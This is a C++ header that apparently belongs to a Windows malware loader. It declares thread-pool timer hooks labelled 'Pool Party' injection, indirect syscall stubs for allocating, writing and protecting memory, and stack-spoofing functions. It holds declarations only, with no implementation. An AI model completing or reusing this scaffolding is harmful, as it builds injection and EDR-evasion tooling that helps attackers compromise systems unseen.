#pragma once
#include <Windows.h>

// ================= NTSTATUS Macros =================
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

// ================= Pool Party Function Pointers =================
typedef struct _TP_TIMER {
    PVOID Unknown[3];
    PVOID Callback;
    PVOID FinalizationCallback;
    PVOID TimerContext;
} TP_TIMER, * PTP_TIMER;

typedef NTSTATUS(NTAPI* pTpAllocTimer)(PTP_TIMER* Timer, PVOID Callback, PVOID Context, PVOID Environment);
typedef NTSTATUS(NTAPI* pTpSetTimer)(PTP_TIMER Timer, PLARGE_INTEGER DueTime, DWORD Period, DWORD WindowLength);

// ================= Safe Memory Zeroing =================
typedef PVOID(NTAPI* pRtlSecureZeroMemory)(PVOID ptr, SIZE_T size);

// ================= Global Function Pointers =================
extern pTpAllocTimer          S_TpAllocTimer;
extern pTpSetTimer            S_TpSetTimer;
extern pRtlSecureZeroMemory   S_RtlSecureZeroMemory;

// ================= Syscall Variables =================
extern "C" DWORD wNtAllocateVirtualMemory;
extern "C" DWORD wNtWriteVirtualMemory;
extern "C" DWORD wNtProtectVirtualMemory;
extern "C" DWORD wNtDelayExecution;

extern "C" UINT_PTR sysAddrNtAllocateVirtualMemory;
extern "C" UINT_PTR sysAddrNtWriteVirtualMemory;
extern "C" UINT_PTR sysAddrNtProtectVirtualMemory;
extern "C" UINT_PTR sysAddrNtDelayExecution;

// ================= Syscall Functions =================
extern "C" NTSTATUS Asm_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
extern "C" NTSTATUS Asm_NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
extern "C" NTSTATUS Asm_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);
extern "C" NTSTATUS Asm_NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);

// ================= Stack Spoofing Functions =================
extern "C" void SpooledExecution(PVOID Function, PVOID Param1, PVOID Param2, PVOID Param3);
extern "C" void ValidateStackAlignment(void);
